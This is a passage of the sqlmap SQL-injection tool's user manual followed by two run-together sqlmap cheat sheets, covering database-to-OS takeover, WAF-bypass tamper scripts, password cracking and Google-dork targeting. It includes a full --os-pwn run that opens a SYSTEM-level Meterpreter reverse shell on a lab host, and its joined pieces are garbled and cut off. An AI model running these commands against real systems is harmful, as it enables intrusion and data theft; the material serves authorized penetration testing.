     004 ). sqlmap has its own exploit to trigger the vulnerability with automatic DEP memory protection
     bypass, but it relies on Metasploit to generate the shellcode to get executed upon successful exploitation
     - switch --os-bof.

These techniques are detailed in the white paper Advanced SQL injection to operating system full control
and in the slide deck Expanding the control over the operating system from the database .
Example against a MySQL target:

     $ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1" --os-pwn \
       --msf-path /software/metasploit

     [...]
     [hh:mm:31] [INFO] the back-end DBMS is MySQL
     web server operating system: Windows 2003
     web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0
     back-end DBMS: MySQL 5.0
     [hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system
     [hh:mm:31] [INFO] the back-end DBMS operating system is Windows
     how do you want to establish the tunnel?
     [1] TCP: Metasploit Framework (default)
     [2] ICMP: icmpsh - ICMP tunneling
     >
     [hh:mm:32] [INFO] testing if current user is DBA
     [hh:mm:32] [INFO] fetching current user
     what is the back-end database management system architecture?
     [1] 32-bit (default)
     [2] 64-bit
     >
     [hh:mm:33] [INFO] checking if UDF 'sys_bineval' already exist
     [hh:mm:33] [INFO] checking if UDF 'sys_exec' already exist
     [hh:mm:33] [INFO] detecting back-end DBMS version from its banner
     [hh:mm:33] [INFO] retrieving MySQL base directory absolute path
     [hh:mm:34] [INFO] creating UDF 'sys_bineval' from the binary UDF file
     [hh:mm:34] [INFO] creating UDF 'sys_exec' from the binary UDF file
     how do you want to execute the Metasploit shellcode on the back-end database underlying
     operating system?
     [1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)
     [2] Stand-alone payload stager (file system way)
     >
     [hh:mm:35] [INFO] creating Metasploit Framework 3 multi-stage shellcode
5. Usage                                                                                           40


    which connection type do you want to use?
    [1] Reverse TCP: Connect back from the database host to this machine (default)
    [2] Reverse TCP: Try to connect back from the database host to this machine, on all ports
    between the specified and 65535
    [3] Bind TCP: Listen on the database host for a connection
    >
    which is the local address? [192.168.136.1]
    which local port number do you want to use? [60641]
    which payload do you want to use?
    [1] Meterpreter (default)
    [2] Shell
    [3] VNC
    >
    [hh:mm:40] [INFO] creation in progress ... done
    [hh:mm:43] [INFO] running Metasploit Framework 3 command line interface locally, please wait..

                                    _
                                   | |      o
     _ _ _     _ _|_ __,   ,    _ | | __      _|_
    / |/ |/ | |/ | / | / \_|/ \_|/ / \_| |
      | | |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/
                             /|
                             \|


           =[   metasploit v3.7.0-dev [core:3.7 api:1.0]
    + -- --=[   674 exploits - 351 auxiliary
    + -- --=[   217 payloads - 27 encoders - 8 nops
           =[   svn r12272 updated 4 days ago (2011.04.07)

    PAYLOAD => windows/meterpreter/reverse_tcp
    EXITFUNC => thread
    LPORT => 60641
    LHOST => 192.168.136.1
    [*] Started reverse handler on 192.168.136.1:60641
    [*] Starting the payload handler...
    [hh:mm:48] [INFO] running Metasploit Framework 3 shellcode remotely via UDF 'sys_bineval',
    please wait..
    [*] Sending stage (749056 bytes) to 192.168.136.129
    [*] Meterpreter session 1 opened (192.168.136.1:60641 -> 192.168.136.129:1689) at Mon Apr 11
    hh:mm:52 +0100 2011

    meterpreter >   Loading extension espia...success.
    meterpreter >   Loading extension incognito...success.
    meterpreter >   [-] The 'priv' extension has already been loaded.
    meterpreter >   Loading extension sniffer...success.
    meterpreter >   System Language : en_US
    OS                : Windows .NET Server (Build 3790, Service Pack 2).
    Computer          : W2K3R2
    Architecture      : x86
    Meterpreter       : x86/win32
    meterpreter >   Server username: NT AUTHORITY\SYSTEM
    meterpreter >   ipconfig

    MS TCP Loopback interface
5. Usage                                                                                              41


     Hardware MAC: 00:00:00:00:00:00
     IP Address : 127.0.0.1
     Netmask     : 255.0.0.0




     Intel(R) PRO/1000 MT Network Connection
     Hardware MAC: 00:0c:29:fc:79:39
     IP Address : 192.168.136.129
     Netmask     : 255.255.255.0


     meterpreter > exit

     [*] Meterpreter session 1 closed. Reason: User exit


By default MySQL on Windows runs as SYSTEM, however PostgreSQL runs as a low-privileged user postgres
on both Windows and Linux. Microsoft SQL Server 2000 by default runs as SYSTEM, whereas Microsoft SQL
Server 2005 and 2008 run most of the times as NETWORK SERVICE and sometimes as LOCAL SERVICE.
It is possible to provide sqlmap with the --priv-esc switch to perform a database process' user privilege
escalation via Metasploit's getsystem command which include, among others, the kitrap0d technique
(MS10-015 ).


5.14 Windows registry access
It is possible to access Windows registry when the back-end database management system is either MySQL,
PostgreSQL or Microsoft SQL Server, and when the web application supports stacked queries. Also, session
user has to have the needed privileges to access it.

5.14.1 Read a Windows registry key value

Switch: --reg-read
Using this option you can read registry key values.

5.14.2 Write a Windows registry key value

Switch: --reg-add
Using this option you can write registry key values.

5.14.3 Delete a Windows registry key

Switch: --reg-del
Using this option you can delete registry keys.

5.14.4 Auxiliary registry switches

Switches: --reg-key, --reg-value, --reg-data and --reg-type
5. Usage                                                                                                  42


These switches can be used to provide data needed for proper running of options --reg-read, --reg-add
and --reg-del. So, instead of providing registry key information when asked, you can use them at command
prompt as program arguments.
With --reg-key option you specify used Windows registry key path, with --reg-value value item name
inside provided key, with --reg-data value data, while with --reg-type option you specify type of the
value item.
A sample command line for adding a registry key hive follows:

     $ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add \
       --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1


5.15 General
5.15.1 Log HTTP(s) trac to a textual le

Switch: -t
This switch requires an argument that specied the textual le to write all HTTP(s) trac generated by
sqlmap - HTTP(s) requests and HTTP(s) responses.
This is useful primarily for debug purposes.

5.15.2 Session le: save and resume data retrieved

Switch: -s
By default sqlmap logs all queries and their output into a textual le called session le , regardless of the
technique used to extract the data. This is useful if you stop the injection for any reason and rerun it
afterwards: sqlmap will parse the session le and resume enumerated data from it, then carry on extracting
data from the exact point where it left before you stopped the tool.
The default session le is output/TARGET_URL/session, but you can specify a dierent le path with -s
switch.
The session le has the following structure:

     [hh:mm:ss MM/DD/YY]
     [Target URL][Injection point][Parameters][Query or information name][Query output or value]


A more user friendly textual le where all data retrieved is saved, is the log le , output/TARGET_URL/log.
This le can be useful to see all information enumerated to the end.

5.15.3 Flush session le

Switch: --flush-session
As you are already familiar with the concept of a session le from the description above, it is good to know
that you can ush the content of that le using option --flush-session. This way you can avoid the caching
mechanisms implemented by default in sqlmap. Other possible way is to manually remove the session le(s).
5. Usage                                                                                                   43


5.15.4 Ignores query results stored in session le

Switch: --fresh-queries
As you are already familiar with the concept of a session le from the description above, it is good to know
that you can ignore the content of that le using option --fresh-queries. This way you can keep the
session le untouched and for a selected run, avoid the resuming/restoring of queries output.

5.15.5 Estimated time of arrival

Switch: --eta
It is possible to calculate and show in real time the estimated time of arrival to retrieve each query output.
This is shown when the technique used to retrieve the output is any of the blind SQL injection types.
Example against an Oracle target aected only by boolean-based blind SQL injection:

     $ python sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1" -b --eta

     [...]
     [hh:mm:01] [INFO]   the back-end DBMS is Oracle
     [hh:mm:01] [INFO]   fetching banner
     [hh:mm:01] [INFO]   retrieving the length of query output
     [hh:mm:01] [INFO]   retrieved: 64
     17% [========>                                                ] 11/64   ETA 00:19


Then:

     100% [===================================================] 64/64
     [hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod

     web application technology: PHP 5.2.6, Apache 2.2.9
     back-end DBMS: Oracle
     banner:    'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod'


As you can see, sqlmap rst calculates the length of the query output, then estimates the time of arrival,
shows the progress in percentage and counts the number of retrieved output characters.

5.15.6 Update sqlmap

Switch: --update
Using this option you can update the tool to the latest development version directly from the subversion
repository. You obviously need Internet access.
If, for any reason, this operation fails, run svn update from your sqlmap working copy. It will perform
the exact same operation of switch --update. If you are running sqlmap on Windows, you can use the
TartoiseSVN client by right-clicking in Windows Explorer into your sqlmap working copy and clicking on
Update.
This is strongly recommended before reporting any bug to the mailing lists .
5. Usage                                                                                                 44


5.15.7 Save options in a conguration INI le

Switch: --save
It is possible to save the command line options to a conguration INI le. The generated le can then be
edited and passed to sqlmap with the -c option as explained above.

5.15.8 Act in non-interactive mode

Switch: --batch
If you want sqlmap to run as a batch tool, without any user's interaction when sqlmap requires it, you can
force that by using --batch switch. This will leave sqlmap to go with a default behaviour whenever user's
input would be required.


5.16 Miscellaneous
5.16.1 Alert when a SQL injection is detected

Switch: --beep
When this switch is provided, sqlmap will beep at every new SQL injection that it nds. It can be useful
when you are processing in batch mode a Google dork output or a proxy log le so that you do not need to
monitor the terminal constantly.

5.16.2 IDS detection testing of injection payloads

Switch: --check-payload
Curious to see if a decent intrusion detection system (IDS) picks up sqlmap payloads? Use this switch!

5.16.3 Cleanup the DBMS from sqlmap specic UDF(s) and table(s)

Switch: --cleanup
It is recommended to clean up the back-end database management system from sqlmap temporary table(s)
and created user-dened function(s) when you are done taking over the underlying operating system or le
system. Switch --cleanup will attempt to clean up the DBMS and the le system wherever possible.

5.16.4 Parse and test forms' input elds

Switch: --forms
Say that you want to test against SQL injections a huge search form or you want to test a login bypass
(typically only two input elds named like username and password ), you can either pass to sqlmap the
request in a request le (-r), set the POSTed data accordingly (--data) or let sqlmap do it for you!
Both of the above mentioned instances, and many others, appear as <form> and <input> tags in HTML
response bodies and this is where this switch comes into play.
Provide sqlmap with --forms as well as the page where the form can be found as the target url (-u) and
sqlmap will request the target url for you, parse the forms it has and guide you through to test for SQL
injection on those form input elds (parameters) rather than the target url provided.
6. License and copyright                                                                                  45


5.16.5 Use Google dork results from specied page number

Switch: --gpage
Default sqlmap behavior with option -g is to do a Google search and use the rst 100 resulting URLs for
further SQL injection testing. However, in combination with this option you can specify with this switch,
--gpage, some page other than the rst one to retrieve target URLs from.


5.16.6 Display page rank (PR) for Google dork results

Switch: --page-rank
Performs further requests to Google when -g is provided and display page rank (PR) for Google dork results.

5.16.7 Parse DBMS error messages from response pages

Switch: --parse-errors
If the web application is congured in debug mode so that it displays in the HTTP responses the back-end
database management system error messages, sqlmap can parse and display them for you.
This is useful for debugging purposes like understanding why a certain enumeration or takeover switch does
not work - it might be a matter of session user's privileges and in this case you would see a DBMS error
message along the lines of Access denied for user <SESSION USER>.

5.16.8 Replicate dumped data into a sqlite3 database

Switch: --replicate
If you want to store in a local SQLite 3 database le each dumped table (--dump or --dump-all), you can
provide sqlmap with the --replicate switch at dump phase. This will create a <TABLE_NAME>.sqlite3
rather than a <DB_NAME>/<TABLE_NAME>.csv le into output/TARGET_URL/dump/ directory.
You can then use sqlmap itself to read and query the locally created SQLite 3 le. For instance, python
sqlmap.py -d sqlite:///software/sqlmap/output/192.168.136.131/dump/testdb.sqlite3 table.


5.16.9 Simple wizard interface for beginner users

Switch: --wizard
Do you really want to know?


6    License and copyright
sqlmap is released under the terms of the General Public License v2 . sqlmap is copyrighted by its developers
.


7    Disclaimer
sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even
the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
8. Authors                                                                                                  46


Whatever you do with this tool is uniquely your responsibility. If you are not authorized to punch holes in the
network you are attacking be aware that such action might get you in trouble with a lot of law enforcement
agencies.


8    Authors
Bernardo Damele A. G. (inquis) - Lead developer. PGP Key ID: 0x05F5A30F
Miroslav Stampar (stamparm) - Developer. PGP Key ID: 0xB5397B1B
Overview of SQLi AttacksCategories of SQLi attacks include:● In-band● Out-of-band● Inferential (or Blind)● CompoundIn-Band (or Classic) SQLi AttacksIn in-band attacks, the attacker can launch the attack and view results through the samechannel (band), such as via a console shell or web application. The four most popular in-band injection techniques areerror-based,union-based,stacked queries, andinlinequeries. (sqlmap option:--technique)Error-based injectionsError messages displayed in the console or application leak information about the databaseconfigurations, structure, and data.Union-based injectionsUsing UNION and associated keywords, the attacker combines the results from a legitimatequery with those from an attack to extract data, such as by matching user data with locationhistory.Stacked queries (piggybacking)The attacker sends multiple SQL statements joined by a semicolon in the same call to thedatabase server to change the data within or manipulate the server.Inline queriesEmbedding partial SQL statements on the server-side backend makes the server vulnerableto SQLi via client-side input.Out-of-Band SQLi AttacksOut-of-band attacks obtain data using a channel (band) other than the one making therequest. Examples include receiving an email containing query results and sending results toa different web server using a separate HTTP connection.Inferential (or Blind) SQLi AttacksThese involve changing the database behavior to reconstruct information.

 \Boolean injectionsThis inferential attack involves Boolean expressions, such as tautologies. If you are visitingan e-commerce website, you might obtain a product page via the route /product/279, whichtranslates to this query string in the backend:SELECT * FROM products WHERE id='279';But append a tautological statement to the route to get /product/279'%20or%201=1:SELECT * FROM products WHERE id='279' OR 1=1; Since1=1 must evaluate to TRUE, you can see all products regardless of the limitations thevendor has placed on them, such as unannounced or out-of-stock inventory.Time delay injections (time-based attacks)This inferential attack leaves negligible traces of penetration on the database logs during theexploration of an unknown database. Such attacks depend on the database pausing for afixed time before responding, and the injected time delay command differs across SQLlanguages.If the database is not vulnerable to a time-based attack, the results will load quickly despitethe time delay specified.Compound SQLi AttacksCompound SQLi attacks refer to SQLi attacks plus other cyberattacks, such as unauthorizedaccess, distributed denial of service (DDoS), domain name server (DNS) hijacking, andcross-site scripting (XSS). The details of the other attacks are beyond the scope of this cheatsheet.Sqlmap OptionsMandatory Arguments At least one of the following is necessary for the sqlmap command to run:Basic operations Description-hBasic help-hh Advanced help--versionShow sqlmap version number-v VERBOSESet verbosity level whereVERBOSE is an integer between
 0 and 6 inclusive (default: 1)--wizardSimple wizard interface for beginner users--shellPrompt for an interactive sqlmap shell; inside the shell,omitsqlmap and enter options and arguments directly--updateUpdate sqlmap to the latest version--purgeSafely remove all content from sqlmap data directory


 \--list-tampersDisplay list of available tamper scripts 
 --dependenciesCheck for missing (optional) sqlmap dependenciesTarget Description-u URL--url=URLSpecify targetURL, preferably containing vulnerable queryparametersExample:-u "http://www.site.com/vuln.php?id=1" -g GOOGLEDORKProcess Google dork results as target URLs: you input asGoogle dorking queries, and you obtain URL results onwhich you run sqlmap.GOOGLEDORK examples (\ to escape double quote"):● "inurl:\".php?id=1\""● 'intext:csrq filetype:"pdf"'Overusing this command leads to the following warning: [CRITICAL] Google has detected 'unusual'traffic from used IP address disablingfurther searches-d DATABASE_STRINGSpecify connection string for direct database connectionDATABASE_STRING format:● "rdbms://user:password@dbms_ip:dbms_port/database_name" ● "rdbms://database_filepath" DATABASE_STRING examples: ● "sqlite:///home/user/testdb"● 'mysql://admin:999@127.0.0.1:3306/db1'-m /path/to/BULKFILEScan multiple targets listed in textual fileBULKFILE SampleBULKFILE contents:www.target1.com/vuln1.php?q=foobarwww.target2.com/vuln2.asp?id=1www.target3.com/vuln3/id/1*-l /path/to/LOGFILEParse target(s) from Burp or WebScarab proxy log fileLOGFILE -r/path/to/REQUESTFILELoad HTTP request from textual fileREQUESTFILE SampleREQUESTFILE contents:POST /vuln.php HTTP/1.1Host: www.target.comUser-Agent: Mozilla/4.0id=1-c CONFIGFILE.INILoad options from a configuration file (extension.INI),useful for complex attacksGeneral OptionsSet general working parameters.


 \Option Description--batchNever ask for user input, use the default behavior--answersSet predefined answers: parameters are substring(s)of question prompt(s); join multiple answers with acomma. You may use this with--batch.Usage:--answers="quit=N,follow=N"--flush-sessionFlush session files for current target--crawl=CRAWL_DEPTHCrawl (collect links of) the website starting from thetarget URL--crawl-exclude=CRAWL_EXCLUDERegular expression to exclude pages from beingcrawled (e.g.--crawl-exclude="logout" to skipall pages containing the keyword “logout”) --csv-del=CSVDELDelimiting character used in CSV output (default",")--charset=CHARSETBlind SQLi charset (e.g."0123456789abcdef")--dump-format=DUMP_FORMATFormat of dumped data (CSV (default), HTML orSQLITE)--encoding=ENCODINGCharacter encoding used for data retrieval (e.g. GBK)--etaDisplay for each output the estimated time of arrival--flush-sessionFlush session files for current target--output-dir=OUTPUT_DIRCustom output directory path--parse-errorsParse and display DBMS error messages fromresponses--preprocess=SCRIPTUse given script(s) for preprocessing (request)--postprocess=SCRIPTUse given script(s) for postprocessing (response)--repairRedump entries having unknown character marker(denoted by “?” character) --save=SAVECONFIGSave options to a configuration INI file--scope=SCOPERegular expression for filtering targets--skip-heuristicsSkip heuristic detection of vulnerabilities--skip-wafSkip heuristic detection of WAF/IPS protection--web-root=WEBROOTWeb server document root directory (e.g."/var/www")Request OptionsSpecify how to connect to the target URL.Option Description--data=DATAData string to be sent through POST (e.g. "id=1") --cookie=COOKIEHTTP Cookie header value (e.g. "PHPSESSID=77uT7KkibWPPEkSPjBd9GJjPLGj;security=low") --random-agentUse randomly selected HTTP User-Agent headervalue--proxy=PROXYUse a proxy to connect to the target URL--torUse Tor anonymity network--check-torCheck to see if Tor is used properly

 \Optimization OptionsOptimize the performance of sqlmap.Option Description-oTurn on all optimization switches--predict-outputPredict common queries output--keep-aliveUse persistent HTTP(s) connections--null-connectionRetrieve page length without actual HTTP responsebody--threads=THREADSMaximum number of concurrent HTTP(s) requests(default 1)Injection OptionsSpecify the parameters to test against, custom injection payloads, and optional tamperingscripts.Option Description-p TESTPARAMETERTestable parameter(s) (e.g.-p"id,user-agent")--skip=SKIPSkip testing for given parameter(s) (e.g.–-skip="referer")--skip-staticSkip testing parameters that do not appearto be dynamic--param-exclude=PARAM_EXCLUDERegular expression to exclude parametersPARAM_EXCLUDE from testing (e.g. excludea session parameter"ses")--param-filter=PARAM_FILTERSelect testable parameter(s)PARAM_FILTER by place (e.g."POST")--dbms=DBMSForce back-end DBMS to use the given--dbms-cred=DBMS_CREDSDBMS authentication credentialsDBMS_CREDS of the format"user:password" --os=OSForce back-end DBMS operating system tothe value ofOS--invalid-bignumUse big numbers for invalidating values--invalid-logicalUse logical operations for invalidatingvalues--invalid-stringUse random strings for invalidating values--no-castTurn off payload casting mechanism--no-escapeTurn off string escaping mechanism--prefix=PREFIXInjection payload prefix stringPREFIX --suffix=SUFFIXInjection payload suffix stringSUFFIX --tamper=TAMPERUse given script(s)TAMPER for tampering 
 injection dataDetection OptionsCustomize the detection phase of the SQL attack scan.


 \Option Description--level=LEVELLevel of tests to perform (LEVEL takes integers 1-5,default 1)--risk=RISKRisk of tests to perform (RISK takes integers 1-3,default 1)--string=STRINGString to match when query returns True--not-string=NOT_STRINGString to match when query returns False--regexp=REGEXPRegular expression to match when query returns True--code=CODEHTTP code to match when query returns True--smartPerform thorough tests only if positive heuristic(s)--text-onlyCompare pages based only on the textual content--titlesCompare pages based only on their titlesTechniques OptionsTweak testing of specific SQLi techniques.Option Description--technique=TECHNIQUESQLi techniques to use (default"BEUSTQ" explainedbelow)● B: Boolean-based blind ● E: Error-based ● U: Union query-based ● S: Stacked queries ● T: Time-based blind ● Q: Inline queries --time-sec=TIMESECSeconds to delay the DBMS response (default 5)--union-cols=UCOLSRange of columns to test for UNION query SQLi--union-char=UCHARCharacter to use to guess the number of columns bybrute force--union-from=UFROMTable to use in FROM part of UNION query SQLi--dns-domain=DNSDOMAINDomain name used for DNS exfiltration attack--second-url=SECONDURLResulting page URL searched for second-orderresponse--second-req=SECONDREQLoad second-order HTTP request from fileFingerprint Option Assess a database before attacking it.Option Description-f, --fingerprintPerform an extensive DBMS version fingerprintRunning a SQLi Attack Scan with SqlmapThree basic steps underlie a SQLi attack scan:

 \1. Conduct reconnaissance on a database using mandatory target arguments andfingerprinting. 2. Discover potential vulnerabilities by enumerating the database contents. 3. Run tests of different SQLi attacks to determine the extent of these vulnerabilities.Repeat steps 2-3 to your satisfaction.Get a List of Databases on Your System and Their TablesUseenumeration options to scan SQL databases. To get a list of databases on your system,use--dbs. For the tables and their schema, use--tables,--schema, and--columns.Below is an example of exploiting a vulnerability in theid parameter in a given cookiesession to return the database tables (--tables) using default answers to prompts (--batch):sqlmap -u "http://sometestdb.to/view?id=123&Submit=Submit#" --cookie="PHPSESSID=e3f9231953973ace4acb63cfde2ccc08;security=low" --tables --batch To narrow down the exploit to the users column, use the--columns option followed by-T and the desired table name:sqlmap -u "http://sometestdb.to/view?id=123&Submit=Submit#" --cookie="PHPSESSID=e3f9231953973ace4acb63cfde2ccc08;security=low" --columns -T users --batch Enumeration OptionsThese options can be used to enumerate the configuration information, structure and datacontained in the tables of the target database management system.
 Option Description-a, --allRetrieve everything-b, --bannerRetrieve DBMS banner--current-userRetrieve DBMS current user--current-dbRetrieve DBMS current database--dbsEnumerate DBMS databases--exclude-sysdbsExclude DBMS system databases when enumeratingtables--usersEnumerate DBMS users--passwordsEnumerate DBMS users password hashes--tablesEnumerate DBMS database tables--columnsEnumerate DBMS database table columns--schemaEnumerate DBMS schema--countRetrieve number of entries for table(s)--dumpDump (output) DBMS database table entries--dump-allDump all DBMS databases tables entries


 \-D DBDBMS database to enumerate-T TBLDBMS database table(s) to enumerate-C COLDBMS database table column(s) to enumerate-X EXCLUDEDBMS database identifier(s) to not enumerate-U USERDBMS user to enumerateBrute Force OptionsGuess whether the database contains common names for tables, columns, and files.Option Description--common-tablesCheck existence of common tables--common-columnsCheck existence of common columns--common-filesCheck existence of common filesPassword Cracking with SqlmapStraightforward MethodThisrequires read permissions on the target database. In this case, you could enumeratethe password hashes for each user with the--passwords option. sqlmap will firstenumerate the users, then attempt to crack the password hashes.Indirect MethodIf your target database is sufficiently vulnerable, you can look for a table containing user data(e.g.,users) because passwords likely reside there.Once sqlmap discovers a column of passwords, it will prompt you for permission to crack thepasswords, followed by a prompt on whether or not to crack them via a dictionary-basedattack. If the passwords are sufficiently insecure, a “Y” to both prompts will yield meaningfuloutput passwords.Sqlmap's Source Code Structure and How to Navigate ItView the source code of sqlmap here on GitHub. Click here for a high-resolution version ofthe diagram.

 \Important and Useful Sqlmap DirectoriesYou may customize your sqlmap experience by adding or editing files in the followingdirectories. GitHub links refer to directories found in the sqlmap source code.Directory Contents/sqlmap.conf Default values for all options which require defaults tofunction. The value(s) stated in terminal-issued commandstakes precedence over the value(s) in this .conf file./data/xml/payloads SQLi payloads, deployed according to the user’s values of--level and--risk /data/txt Text strings used for guessing column names andpasswords (dictionary-based attacks)/tamper Tamper scripts/output/Results from sqlmap commands returning database valuessuch as--dump.If you use Kali Linux, this directory is at/home/kali/.local/share/sqlmap/output/.Otherwise, the sqlmap terminal output will specify thislocation in an[INFO] message./history/History of commands issued in a sqlmap shell (--shell).If you use Kali Linux, this directory is at/home/kali/.local/share/sqlmap/history.Test --levels and Their Impact on Your CommandsCheck your database against particular SQLi attacks by setting test--level values todictate the volume of tests to perform and the degree of feedback from sqlmap.--level values Description1 (default)  A limited number of tests/requests:GET andPOST parameters willbe tested by default2Test cookies (HTTP cookie header values)

 \3Test cookies plus HTTPUser-Agent/Referer headers’ values 4 As above, plus null values in parameters and other bugs5 An extensive list of tests with an input file for payloads andboundariessqlmap SQLi payloads are usually harmless, but if you want to test your database tobreaking point,--risk is the option to use:--risk valuesDescription1 (default) Data remain unchanged and database remains operable2Include heavy query time-based SQLi attacks, which may slowdown or take down the database3 As above, plus OR-based SQLi tests, the payload of which mayupdate all entries of a table and cause havoc in productionenvironments. Verbosity LevelsThese integer levels (0-6) are for troubleshooting and to see what sqlmap is doing under thehood.Verbosity level Description0Show only Python tracebacks, error, and critical messages1 (default) Show also information and warning messages2Show also debug messages3Show also payloads injected4Show also HTTP requests5Show also HTTP responses' headers6Show also HTTP responses' page contentTamper Scripts and Their ActionsTamper scripts are for bypassing security controls, such as Web Application Firewalls(WAFs) and Intrusion Prevention Systems. There are at least 60 scripts by default, but youcan add custom ones.Useful tamper script commands:Option Description--list-tampers List all tamper scripts in the sqlmap directory--tamper=TAMPERS Invoke tamper script(s)TAMPERS of your choiceExamples:--tamper="random,appendnullbyte,between,base64encode" --tamper="/path/to/custom/tamper_script.py" 

 \Default tamper script actions fall into four categories: Action Tamper script(s) as of sqlmap version 1.6.8.1#devReplacement0eunion, apostrophemask, apostrophenullencode,between, bluecoat, commalesslimit, commalessmid,concat2concatws, dunion, equaltolike, equaltorlike,greatest, hex2char, ifnull2casewhenisnull,ifnull2ifisnull, least, lowercase, misunion,ord2ascii, plus2concat, plus2fnconcat, randomcase,sleep2getlock, space2comment, space2dash, space2hash,space2morecomment, space2morehash, space2mssqlblank,space2mssqlhash, space2mysqlblank, space2mysqldash,space2plus, space2randomblank, substring2leftright,symboliclogical, unionalltounion, unmagicquotes,uppercase Additionhalfversionedmorekeywords, informationschemacomment,multiplespaces, percentage, randomcomments,appendnullbyte, sp_password, varnish, xforwardedforObfuscationbase64encode, binary, chardoubleencode, charencode,charunicodeencode, charunicodeescape,commentbeforeparentheses, escapequotes,htmlencode,modsecurityversioned,modsecurityzeroversioned, overlongutf8,overlongutf8more, schemasplit, versionedkeywords,versionedmorekeywordsBypassluanginx (UA-Nginx WAFs Bypass (e.g. Cloudflare)) We hope this sqlmap cheat sheet makes sqlmap a more enjoyable experience for you. Todownload a PDF version of this sqlmap cheat sheet, click here


Basic optionsThe sqlmap command will not run without at least one of these options added to it.-u URLThe target URLFormat: -u "http://www.target.com/path/file.htm?variable=1"-d DIRECTConnection string for direct database connectionFormat: -d DBMS://DATABASE_FILEPATH or-d DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME-l LOGFILEParse target(s) from Burp or WebScarab proxy log file-m BULKFILE Scan multiple targets given in a textual fileFormat: The file should contain a URL per line-r REQUESTFILE Load HTTP request from a fileFormat: The file can contain an HTTP request or an HTTPS transaction-g GOOGLEDORKProcess Google dork results as target URLs-c CONFIGFILE Load options from a configuration INI file--wizardA guided execution service--updateUpdate sqlmap to the latest version--purgeClear out the sqlmap data folder--purge-outputAs above--dependenciesCheck for missing sqlmap dependencies-hBasic help-hhAdvanced help--versionShow the sqlmap version number-v VERBOSE Verbosity levelCheat Sheet SeriesInjectionThe following options can be used to specify which parameters to test for, provide custominjection payloads and optional tampering scripts.-p TESTPARAMETER Testable parameter(s)--skip=SKIPSkip testing for given parameter(s)--skip-static Skip testing parameters that do not appear to be dynamic--param-exclude=PARAM-EXCLUDERegexp to exclude parameters from testing (e.g. "ses")--param-filter=PARAM-FILTERSelect testable parameter(s) by place (e.g. "POST")--dbms=DBMSForce back-end DBMS to provided value--dbms-cred=DBMS-CREDENTIALSDBMS authentication credentials (user:password)--os=OSForce back-end DBMS operating system to the providedvalue--invalid-bignumUse big numbers for invalidating values--invalid-logicalUse logical operations for invalidating values--invalid-stringUse random strings for invalidating values--no-cast Turn off payload casting mechanism--no-escapeTurn off string escaping mechanism--prefix=PREFIX Injection payload prefix string--suffix=SUFFIX Injection payload suffix string--tamper=TAMPER Use given script(s) for tampering injection dataTechniquesThese options relate to specific attack strategies. They adjust and focus the attack on particulartechniques and targets.--technique=TECHNIQUEThe SQL injection techniques to use (default "BEUSTQ")--time-sec=TIMESEC The number of seconds to delay the DBMS response (default 5)--union-cols=UCOLS A range of columns to test for UNION query SQL injection--union-char=UCHAR A character to use for brute-forcing columns--union-from=UFROM The table to use in the FROM part of a UNION query SQLinjection--dns-domain=DNS-DOMAINThe domain name to use in a DNS exfiltration attack--second-url=SECOND-URL Resulting page URL searched for a second-order response--second-req=SECOND-REQLoad a second-order HTTP request from the file-fPerform an extensive DBMS version fingerprint--fingerprint As aboveVerbosity option valuesPossible verbosity level values are:0Only Python tracebacks, error, and critical messages1Feedback of 0 plus information and warning messages2Feedback of 1 plus debug messages3Feedback of 2 plus the payloads injected4Feedback of 3 plus HTTP requests5Feedback of 4 plus the HTTP headers of responses6Feedback of 5 plus the content of the HTTP responsesOperating system accessThese options can be used to access the operating system supporting the DBMS.--os-cmd=OSCMD Execute an operating system command--os-shell Prompt for an interactive operating system shell--os-pwn Prompt for an OOB shell, Meterpreter or VNC--os-smbrelay One-click prompt for an OOB shell, Meterpreter or VNC--os-bof Stored procedure buffer overflow exploitation--priv-escDatabase process user privilege escalation--msf-path=MSFPATH Local path where Metasploit Framework is installed--tmp-path=TMPPATH Remote absolute path of temporary files directoryOptimizationThe following options can be used to improve the performance of sqlmap.-oTurn on all optimization switches--predict-output Predict common queries output--keep-alive Use persistent HTTP(s) connections--null-connection Retrieve page length without actual HTTP response body--threads=THREADS Max number of concurrent HTTP(s) requests (default 1)RequestAdd these options to a command to specify how to connect to the target URL.-A AGENTHTTP User-Agent header value--user-agent=AGENT As above-H HEADERExtra header (e.g. "X-Forwarded-For: 127.0.0.1")--headers=HEADERS As above--method=METHOD Specify an HTTP method to use, such as POST or PUT--data=DATA Data string to be sent through POST (e.g. "id=1")--param-del=PARAMETER A character to be used for splitting parameter values (e.g., &)--cookie=COOKIE HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")--cookie-del=COOKIE-CHARA character to be used for splitting cookie values (e.g. ;)--live-cookies=LIVE-COOKIESA file containing live cookies to be used for loading values--load-cookies=LOAD-COOKIESAs above with cookies in Netscape/wget format--drop-set-cookie Ignore the Set-Cookie header in the response--mobile Imitate a smartphone through HTTP User-Agent header--random-agent Use a randomly selected HTTP User-Agent header value--host=HOSTAn HTTP Host header value--referer=REFERER An HTTP Referer header value--auth-type=AUTH-TYPE An HTTP authentication type (Basic, Digest, NTLM or PKI)--auth-cred=AUTH-CRED HTTP authentication credentials (name:password)--auth-file=AUTH-FILE HTTP authentication PEM cert/private key file--ignore-code=IGNORE-CODEIgnore (problematic) HTTP error code (e.g. 401)--ignore-proxy Ignore system default proxy settings--ignore-redirects Ignore redirection attempts--ignore-timeouts Ignore connection timeouts--proxy=PROXY Use a proxy to connect to the target URL--proxy-cred=PROXY-LOGINProxy authentication credentials (name: password)--proxy-file=PROXY-LIST Load proxy list from a file--proxy-freq=PROXY-RATE Number of requests between the change of 